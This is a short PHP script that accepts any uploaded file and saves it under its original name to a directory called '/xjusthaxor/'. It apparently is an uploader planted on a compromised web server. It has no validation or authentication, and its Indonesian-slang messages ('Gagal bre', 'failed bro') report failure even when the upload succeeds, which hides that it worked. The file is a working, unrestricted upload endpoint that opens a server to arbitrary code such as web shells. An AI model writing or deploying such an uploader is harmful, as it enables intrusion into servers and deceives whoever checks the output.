<?php
$uploaddir = '/xjusthaxor/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

echo '<pre>';
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
    echo "Gagal bre wkwkwk\n";
} else {
    echo "Gagal bre\n";
}

echo 'Gagal eak :v:';
print_r($_FILES);

print "</pre>";

?>
